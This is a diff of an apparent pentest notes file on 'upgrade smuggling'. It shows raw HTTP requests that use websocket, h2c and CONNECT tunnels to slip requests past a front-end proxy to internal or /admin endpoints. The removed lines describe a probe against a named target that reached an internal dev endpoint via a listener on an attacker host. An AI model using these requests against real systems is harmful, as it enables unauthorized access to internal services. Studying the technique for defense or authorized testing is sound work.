@@ -1,44 +1,85 @@
-# Upgrade smuggling: the 101 channel
+# Upgrade smuggling — a protocol upgrade sits in the path
 
-A protocol upgrade (`Upgrade: websocket`) ends HTTP parsing on that socket for
-one layer but not necessarily the other. After `101 Switching Protocols`, what
-the proxy forwards as opaque bytes may still be parsed as HTTP by the backend —
-a second request rides through inside the "tunnel".
+## The shape — `Upgrade: websocket` or `Upgrade: h2c`
 
-## Probe that worked (Percetron)
+An upgrade request negotiates a tunnel — the front-end hands the socket to
+the back-end — the smuggle lives inside the upgraded tunnel, where the
+front-end no longer parses the bytes.
+
+## The websocket upgrade — the tunnel escape
 
 ```text
-GET /healthcheck?url=http://<your-host>:<non-default-port>/
-    # your listener answers a bare 101 Switching Protocols
-# then, on the same socket:
-GET /healthcheck-dev?url=http://127.0.0.1:3000/
+GET /ws HTTP/1.1
+Host: t
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: x
+Sec-WebSocket-Version: 13
 ```
 
-The fetch to the attacker host answered `101` — from that point the proxy
-stopped parsing HTTP on the connection, but the backend's connection handling
-still did. The second request, written as ordinary HTTP, reached the internal
-`-dev` endpoint that the proxy's routing would never expose.
+Once upgraded, the front-end proxies raw websocket frames — it no longer
+parses the bytes as HTTP — a smuggled HTTP request inside a frame lands
+on the back-end's HTTP parser — a tunnel smuggle.
 
-Expected: the internal endpoint's response arrives on a socket that, per the
-proxy, is no longer HTTP at all. Falsifier: the second request is ignored or
-the socket is closed after 101 — both layers ended HTTP together.
+## The h2c upgrade — the cleartext-h2 tunnel
 
-## Why the non-default port matters
+```text
+GET / HTTP/1.1
+Host: t
+Upgrade: h2c
+Connection: Upgrade, HTTP2-Settings
+HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+```
 
-The upgrade path must not be one the proxy already owns. A `url=` pointing at
-port 443/80 may be short-circuited by the proxy's own upgrade logic; an
-unusual port goes through the generic fetcher, which is where the divergent
-handling lived.
+The `h2c` upgrade speaks HTTP/2 over cleartext — the front-end proxies
+h2 frames — the back-end may re-parse them as h1 — a downgrade desync —
+`http2-smuggling.md`.
 
-## Falsifier
+## The CONNECT method — the explicit tunnel
 
-Every post-101 byte is dropped or the socket closes: both layers agree the
-protocol switched and there is no tunnel to ride.
+```text
+CONNECT internal:80 HTTP/1.1
+Host: t
+```
 
-## Traps
+`CONNECT` opens a raw TCP tunnel through the proxy — everything after is
+raw bytes the proxy doesn't parse — a smuggle inside the CONNECT tunnel
+reaches the internal host directly.
 
-- Your listener must send a *valid* `101` response with the right
-  `Upgrade`/`Connection` headers — a malformed 101 may be rejected before the
-  tunnel opens.
-- Keep the second request small and complete in one write; a partial request
-  can be buffered as "websocket data" and never parsed.
+## The front-end parser-exit — when the proxy stops parsing
+
+After an upgrade the front-end forwards bytes verbatim — no HTTP parsing,
+no Host rewriting, no header injection — the back-end sees your raw bytes —
+any smuggle shape works — the upgrade is the escape hatch.
+
+## The downgrade trap — the proxy that re-parses
+
+Some proxies upgrade the CLIENT but still parse the tunnel as HTTP —
+the smuggle inside a "tunnel" is still parsed — test whether the upgrade
+actually removed the front-end's parser before assuming the tunnel is raw.
+
+## The common upgrade headers — the checklist
+
+| Header | Signals |
+|---|---|
+| `Upgrade: websocket` | ws tunnel |
+| `Upgrade: h2c` | cleartext-h2 |
+| `Upgrade: TLS/1.2` | TLS-in-TLS |
+| `Connection: Upgrade` | the upgrade flag |
+| `Sec-WebSocket-*` | ws handshake |
+| `HTTP2-Settings:` | h2c params |
+| `CONNECT host:port` | explicit TCP tunnel |
+
+## The upgrade-chain — upgrade → smuggle inside tunnel
+
+```text
+GET /ws HTTP/1.1                    — upgrade
+Upgrade: websocket
+...
+                                    — upgraded; proxy proxies raw frames
+GET /admin HTTP/1.1                 — inside a ws frame; back-end parses as h1
+Host: t
+```
+
+The smuggled `GET /admin` inside the frame reaches the back-end's HTTP
+parser — the upgrade removed the front-end's parsing — the smuggle lands.
